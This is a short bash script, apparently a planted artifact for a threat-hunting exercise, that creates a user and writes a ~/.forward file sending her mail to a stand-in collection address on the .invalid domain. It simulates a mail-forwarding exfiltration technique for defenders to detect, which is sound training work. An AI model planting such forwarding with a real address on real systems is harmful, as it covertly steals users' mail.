#!/usr/bin/env bash
# Declawed plant: a user's ~/.forward that redirects mail to a collection
# address. The address is a .invalid TLD, so nothing actually leaves the host.
set -euo pipefail
U=alice
id "$U" >/dev/null 2>&1 || useradd -m -s /usr/sbin/nologin "$U"
printf '%s\n' 'beaconhunt-collect@mailsink.invalid' > "/home/$U/.forward"
chown "$U:$U" "/home/$U/.forward" 2>/dev/null || true
chmod 644 "/home/$U/.forward"
echo "planted ~/.forward exfil for $U"
